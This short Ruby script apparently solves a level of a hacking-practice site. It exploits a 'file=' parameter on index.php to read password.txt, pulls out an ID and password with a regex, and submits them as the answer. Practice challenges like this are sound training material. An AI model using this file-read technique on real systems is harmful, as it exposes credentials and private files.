# encoding: utf-8
require_relative 'hack_utils'

url = 'http://www.hackerschool.jp/hack/take11/index.php?file=password.txt'
data = RestClient.get(url).body
id, pass = data.match(/ID:(\w+),pass:(\w+)/).to_a[1,2]
puts "id:#{id}, pass:#{pass}"

url = 'http://www.hackerschool.jp/hack/take11/index.php?file=index.html'
HackUtils.post_answer_with_url(url, :id => id, :pass => pass)
